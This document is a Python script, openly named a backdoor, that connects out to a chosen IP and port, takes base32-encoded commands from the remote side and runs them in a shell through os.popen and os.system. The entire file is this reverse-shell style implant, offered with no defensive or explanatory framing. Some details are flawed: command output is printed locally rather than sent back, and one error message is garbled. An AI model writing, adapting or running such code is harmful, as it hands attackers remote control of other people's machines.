import os
import sys
import socket
import base64
import datetime

def backdoor(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print("\nConnected to Target.")

        while True:
            command = sock.recv(64).strip() # Received command from remote

            if not command:
                break

            try:
                # Decode the received command
                decoded_command = base64.b32decode(command).decode("utf-8")

                # Execute the command and print the output
                if "exit" in decoded_command or "quit" in decoded_command:
                    break # Exit backdoor if user types exit/quit
                elif "ls" in decoded_command:
                    output = os.popen(decoded_command).read().strip()
                    print("Executing ls command:")
                    print(f"\n{output}")
                else:
                    # Execute any other command (e.g., python, sh)
                    output = os.system(decoded_command) # Executes in shell
                    print(f"Executing command: {decoded_command}")
                    print(f"\n{output}")

            except Exception as e:
                print(f"Error executing command '{decoded_command}': {e}")
                break


    except socket.gaierror as e:
        print(f"\nSocket error: Could not resolve hostname or IP address: {e}")
    except ConnectionRefusedError as e:
        print(f"\nConnection Refused: Target host is offline, using incorrect port, or a firewall blocked the connection (TCP 13).")
    except Exception as e:
        print(f"\nGeneral Socket Error: {e}. Check if the target machine has an open shell for TCP connections.")

    finally:
        if "sock" in locals() and sock is not None:
            sock.close() # Always close the socket


def main():
    # Default values, can be overridden via command line arguments
    target_ip = "127.0.0.1"  # Replace with the target machine's IP address
    target_port = 8080      # Replace with a desired port

    # Get IPs and Ports from Command Line Arguments (if provided)
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    
    if len(sys.argv) > 2:
        try:
            target_port = int(sys.argv[2])
        except ValueError:
            print("\nInvalid Port Number! Using Default (8080).")

    # Print status and connect
    print("Backdoor started.")
    print(f"Target IP: {target_ip}, Target Port: {target_port}")
    print("Waiting for commands...") # User Prompt.

    backdoor(target_ip, target_port)


if __name__ == "__main__":
    main()
